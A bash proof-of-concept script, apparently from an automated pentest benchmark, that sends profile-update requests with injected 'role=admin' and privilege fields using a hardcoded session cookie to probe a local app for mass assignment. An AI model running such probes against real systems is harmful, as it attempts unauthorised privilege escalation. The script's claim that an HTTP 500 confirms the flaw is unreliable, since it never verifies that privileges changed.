#!/bin/bash
# POC: Demonstrates mass assignment vulnerability in profile update endpoint by submitting unexpected 'role' parameter, triggering 500 Internal Server Error
# Target: ./repo
# Created: 2025-11-04T20:00:44.675Z
# Session: benchmark-XBEN-023-24-mhkytbq3

# Mass Assignment Vulnerability POC - Profile Update Endpoint
# Tests if the /profile endpoint properly validates and filters input parameters
# or if it suffers from mass assignment/parameter pollution issues

TARGET_URL="${1:-http://localhost}"
PROFILE_ENDPOINT="${TARGET_URL}/profile"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQpZOA.GWu3y1B6ZqUPVVv7fnSdpVurO5I"

echo "[*] Mass Assignment Vulnerability Test - Profile Update Endpoint"
echo "[*] Target: ${PROFILE_ENDPOINT}"
echo ""

# Test 1: Normal profile update (baseline - should succeed with 200 OK)
echo "[TEST 1] Normal profile update (baseline)"
echo "Sending: name=Test&lastname=User&email=test@example.com&loan_amount=5000&loan_term_months=60&monthly_payment=100"
RESPONSE_1=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=5000&loan_term_months=60&monthly_payment=100" \
  -b "${SESSION_COOKIE}" \
  "${PROFILE_ENDPOINT}")

HTTP_CODE_1=$(echo "${RESPONSE_1}" | tail -n1)
BODY_1=$(echo "${RESPONSE_1}" | head -n-1)

echo "HTTP Status: ${HTTP_CODE_1}"
if [ "${HTTP_CODE_1}" = "200" ] || [ "${HTTP_CODE_1}" = "302" ]; then
  echo "✓ Normal request successful"
else
  echo "✗ Normal request failed with HTTP ${HTTP_CODE_1}"
fi
echo ""

# Test 2: Profile update with unexpected 'role' parameter (vulnerability test)
echo "[TEST 2] Profile update with unexpected 'role=admin' parameter"
echo "Sending: name=Test&lastname=User&email=admin@test.com&loan_amount=1000&loan_term_months=12&monthly_payment=100&role=admin"
RESPONSE_2=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&lastname=User&email=admin@test.com&loan_amount=1000&loan_term_months=12&monthly_payment=100&role=admin" \
  -b "${SESSION_COOKIE}" \
  "${PROFILE_ENDPOINT}")

HTTP_CODE_2=$(echo "${RESPONSE_2}" | tail -n1)
BODY_2=$(echo "${RESPONSE_2}" | head -n-1)

echo "HTTP Status: ${HTTP_CODE_2}"
echo "Response Body (first 200 chars):"
echo "${BODY_2}" | head -c 200
echo ""
echo ""

# Test 3: Profile update with multiple unexpected parameters
echo "[TEST 3] Profile update with multiple unexpected parameters (role, privileges, admin_level)"
RESPONSE_3=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&lastname=User&email=test@test.com&loan_amount=5000&loan_term_months=60&monthly_payment=100&role=admin&privileges=all&admin_level=10" \
  -b "${SESSION_COOKIE}" \
  "${PROFILE_ENDPOINT}")

HTTP_CODE_3=$(echo "${RESPONSE_3}" | tail -n1)
BODY_3=$(echo "${RESPONSE_3}" | head -n-1)

echo "HTTP Status: ${HTTP_CODE_3}"
echo "Response Body (first 200 chars):"
echo "${BODY_3}" | head -c 200
echo ""
echo ""

# Analysis
echo "[VULNERABILITY ANALYSIS]"
if [ "${HTTP_CODE_2}" = "500" ]; then
  echo "✓ VULNERABLE: Unexpected 'role' parameter triggers HTTP 500 error"
  echo "  This indicates the application may be directly mapping parameters to database fields"
  echo "  without proper validation or filtering (mass assignment vulnerability)"
  VULN_CONFIRMED=1
elif [ "${HTTP_CODE_2}" = "400" ]; then
  echo "✓ NOT VULNERABLE: Application properly rejects unexpected parameters with HTTP 400"
  VULN_CONFIRMED=0
elif [ "${HTTP_CODE_2}" = "200" ] || [ "${HTTP_CODE_2}" = "302" ]; then
  echo "⚠ POTENTIALLY VULNERABLE: Unexpected parameters accepted without error"
  echo "  Application silently accepts unexpected parameters (mass assignment possible)"
  VULN_CONFIRMED=1
else
  echo "? UNCLEAR: Unexpected HTTP response code ${HTTP_CODE_2}"
  VULN_CONFIRMED=0
fi

echo ""
echo "[SUMMARY]"
echo "Test 1 (Baseline): HTTP ${HTTP_CODE_1}"
echo "Test 2 (With role=admin): HTTP ${HTTP_CODE_2}"
echo "Test 3 (Multiple params): HTTP ${HTTP_CODE_3}"

if [ ${VULN_CONFIRMED} -eq 1 ]; then
  echo ""
  echo "✓ VULNERABILITY CONFIRMED: Application does not properly validate input parameters"
  exit 0
else
  echo ""
  echo "✗ Vulnerability not confirmed"
  exit 1
fi